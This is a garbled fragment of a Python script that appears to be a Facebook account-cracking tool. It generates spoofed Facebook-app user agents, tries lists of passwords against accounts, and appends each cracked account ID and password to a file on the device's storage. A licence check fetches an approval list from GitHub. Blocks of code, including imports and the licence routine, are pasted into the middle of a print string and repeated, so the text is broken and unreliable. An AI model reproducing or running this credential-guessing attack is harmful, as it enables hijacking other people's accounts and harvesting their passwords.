...
def superuser():
    ...
    if id in DARK:
        ...
        os.system("xdg-open https://www.facebook.com/profile.php?id=100093402519904")
        superuser()        
superuser()        k=random.randrange(40,150)
        l='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/422.0.0.26.76;]'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f'\r\33[1;92m [HRI#DEC BYB:- ASHIK CHOWDHURY
#GITHUB:- RX-ASHIK
#FUCK YOU MEHEDI 
#TUTUL AR BAP ASHIK 😈from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as ThreadPool
...
def superuser():
    ...
    if id in DARK:
        ...
        os.system("xdg-open https://www.facebook.com/profile.php?id=100093402519904")
        superuser()        
superuser()DOYE-OK] '+cid+' | '+ps+'\33[0;92m')
                #print(f'\r\033[1;92m=[💚]=COOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/HRIDOYE-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
...
def superuser():
    ...
    id = "5".join(uuid)
    print(logo)
    DARK=requests.get("https://github.com/khanbrother420/Premium-2.0/blob/main/Approval.txt").text
    if id in DARK:
        Main()
    else:
        os.system("clear")
        ...
        print ("")
        input(" Press Enter To Send Key")
        os.system("xdg-open https://www.facebook.com/profile.php?id=100019487550831")
        superuser()        
superuser()
